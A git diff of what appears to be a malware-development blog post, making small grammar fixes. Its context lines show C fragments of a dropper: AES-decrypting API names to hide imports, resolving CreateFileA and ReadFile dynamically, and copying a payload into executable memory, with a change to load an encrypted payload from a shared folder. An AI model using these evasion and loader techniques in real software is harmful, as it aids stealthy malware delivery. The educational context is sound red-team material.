@@ -96,7 +96,7 @@ the strings decryption
   AESDecrypt((char *) sCreateFileA, sizeof(sCreateFileA), key, sizeof(key));
   AESDecrypt((char *) sReadFile, sizeof(sReadFile), key, sizeof(key));
 ```
-and the address assignment to the function pointers
+and the address assignment to the function pointers.
 ```c
   pCreateFileA = GetProcAddress(GetModuleHandle(sKernel), sCreateFileA);
   pReadFile = GetProcAddress(GetModuleHandle(sKernel), sReadFile);
@@ -131,7 +131,7 @@ Last but not least, as for the previous post, we must change the way the payload
   // Copy p0 to new memory buffer
   pRtlMoveMemory(exec_mem, p0, p0_len);
 ```
-In the code trunk below, referred to the dropper of the previous post, the payload is loaded from the resources and extracted from the image but now we have an encrypted file on shared folder so we have to change the dropper like this
+In the code trunk below, referred to the dropper of the previous post, the payload is loaded from the resources and extracted from the image but now we have an encrypted file in a shared folder so we have to change the dropper like this
 
 ```c
   // Load the payload from FS to memory
